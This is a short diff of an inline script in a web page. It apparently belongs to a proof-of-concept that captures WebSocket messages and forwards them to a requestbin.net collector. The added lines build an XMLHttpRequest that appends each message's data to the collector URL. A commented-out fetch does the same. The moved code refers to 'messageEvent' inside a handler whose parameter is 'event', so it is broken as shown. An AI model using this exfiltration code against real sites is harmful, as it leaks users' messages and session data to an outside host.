@@ -16,14 +16,15 @@
     function handleReply(event)
     {
       console.log(event);
+	var xhttp = new XMLHttpRequest();
+	xhttp.open("GET", "http://requestbin.net/r/34y37frp?m=" + messageEvent.data, true);
+	xhttp.send();
       //fetch('http://requestbin.net/r/34y37frp?'+event.data, {mode: 'no-cors'});
     }
 		  
 websocket.after = function(messageEvent, url, wsObj)
 {
-	var xhttp = new XMLHttpRequest();
-	xhttp.open("GET", "http://requestbin.net/r/34y37frp?m=" + messageEvent.data, true);
-	xhttp.send();
+	
 }
 	  </script>
 
